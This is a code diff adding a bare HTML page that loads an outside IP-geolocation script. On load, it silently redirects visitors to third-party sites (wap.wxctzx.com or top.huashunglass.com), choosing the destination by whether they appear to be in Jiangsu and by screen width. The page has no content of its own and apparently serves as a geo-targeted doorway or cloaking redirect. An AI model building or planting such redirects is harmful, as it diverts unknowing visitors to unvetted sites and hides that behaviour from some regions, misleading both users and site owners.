@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+</head>
+<body onload="ScreenWidth()">
+	<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+	<script language="JavaScript">
+	function ScreenWidth(){
+		var city = returnCitySN.cname;
+		if(city.indexOf('江苏') >= 0) {
+			if (screen.width <= 768){
+			    window.location.href = 'http://wap.wxctzx.com/?weibo_fst';
+			}else {
+			    window.location.href = 'http://top.huashunglass.com/zzh/mr/index.html';
+			}
+		}else{
+			window.location.href = 'http://top.huashunglass.com/zzh/mr/index.html';
+		}
+	}
+	</script>
+</body>
+</html>
